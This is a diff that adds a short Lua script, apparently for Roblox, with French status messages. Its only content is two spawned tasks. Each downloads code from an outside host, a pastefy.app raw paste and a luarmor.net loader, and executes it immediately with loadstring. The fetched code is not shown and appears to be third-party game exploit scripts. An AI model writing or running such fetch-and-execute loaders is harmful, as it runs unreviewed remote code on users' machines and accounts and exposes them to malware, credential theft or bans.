@@ -1,0 +1,17 @@
+print("Lancement des scripts...")
+
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/nfSsGZm0/raw"))()
+    end)
+    if not success then warn("Erreur Script 1: " .. err) end
+end)
+
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/a4731111c49fa76b7e545ac6f3d8a09a.lua"))()
+    end)
+    if not success then warn("Erreur Script 2: " .. err) end
+end)
+
+print("Chargement terminé !")
